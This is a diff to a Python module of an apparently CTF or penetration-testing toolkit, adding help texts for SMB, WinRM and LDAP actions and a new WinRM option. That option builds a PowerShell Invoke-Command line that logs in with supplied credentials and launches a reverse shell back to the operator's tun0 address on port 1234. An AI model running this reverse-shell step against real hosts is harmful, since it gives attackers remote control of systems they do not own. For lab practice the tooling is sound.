@@ -1,7 +1,19 @@
 import os 
-import config
+import config, payload
 
 def smb_view(box, path):
+    if config.HELP:    
+        print("""
+Action:\t[Protocol] smb
+Tool:\tnetexec, impacket
+Option:\t-u, --username
+\t-p --password; -H, --hash; -k
+Desc:\t1. Lists all existing SMB shares with permissions
+\t2. Lists all readable file names and stores them in a file under enum/
+\t3. Displays a command that can be used to log in via SMB
+Info:\t/
+        """)
+        return 0
     config.required_creds(box)
     os.chdir(path.ws_enum)
     print('\033[93m[*]\033[0m List SMB shares & files')
@@ -34,6 +46,21 @@ def smb_view(box, path):
     print('\033[92m[+]\033[0m List SMB shares\n')
 
 def winrm(box, path, cmd):
+    if config.HELP:    
+        print("""
+Action:\t[Protocol] winrm
+Tools:\tevil-winrm
+Option:\t-u, --username
+\t-p --password; -H, --hash; -k
+\t-x, --cmd (Optional)
+\t-t, --target (Optional)
+Desc:\tLogs in via WinRM.\n\tOptionally execute a command or as the specified target.
+\t ~ user = read user.txt from the current Desktop folder
+\t ~ root = read root.txt from the administrator Desktop folder
+\t ~ rs   = open a reverse shell for this user or target
+Info:\tWhen passing commands with options, the shell closes or hangs.
+        """)
+        return 0
     config.required_creds(box)
     #os.chdir(path.ws_scr)
     print('\033[93m[*]\033[0m Login to WinRm (run CMD)')
@@ -43,8 +70,21 @@ def winrm(box, path, cmd):
             ps_cmd = f'''echo "gc (join-path ([Environment]::GetFolderPath('Desktop')) user.txt)" | '''
         elif cmd.replace(".txt","") == "root":
             ps_cmd = f'''echo "type /Users/Administrator/Desktop/root.txt" | '''
-        else:
-            ps_cmd = f'''echo "{cmd}" | '''
+        elif cmd == "rs":
+            # pass via cmd=rs-ps or rs-runas (to do)
+            username = box.username
+            password = box.password
+            if box.target:
+                if ":" not in box.target:
+                    print("\033[91m[!]\033[0m Separate username and password with :")
+                    exit()
+                username, password = box.target.split(":", 1)
+            ip = config.get_tun0_ip()
+            port = "1234"
+            print(f'[*] Run revshell as {username} : {password}')
+            print(f'[*] Start listener on {ip}:{port}')
+            ps_cmd = f'''echo "$c=New-Object PSCredential('{box.domain}\\{username}',(ConvertTo-SecureString '{password}' -AsPlainText -Force)); icm {box.hostname} -Cred $c {{ cmd /c {payload.revshell_ps(username, password, ip, port)} }}" | '''.replace('$', '\\$')
+
     if box.krb or isinstance(box.krb, str):
         cmd = f"{ps_cmd}{box.krb_ccache} evil-winrm -i {box.fqdn} -r {box.domain}"
     elif box.nt_hash:
@@ -57,6 +97,17 @@ def winrm(box, path, cmd):
     print('\033[92m[+]\033[0m Login to WinRm')
 
 def ldap(box, path, cmd):
+    if config.HELP:    
+        print("""
+Action:\t[Protocol] ldap
+Tool:\tnetexec
+Option:\t-u, --username
+\t-p, --password; -H, --hash; -k
+\t-x, --cmd (Optional)
+Desc:\tLogs in via LDAP.\n\tSend a query but no filter is set.
+Info:\t/
+        """)
+        return 0
     config.required_creds(box)
     os.chdir(path.ws_enum)
     print('\033[93m[*]\033[0m Login to LDAP (run Query)')
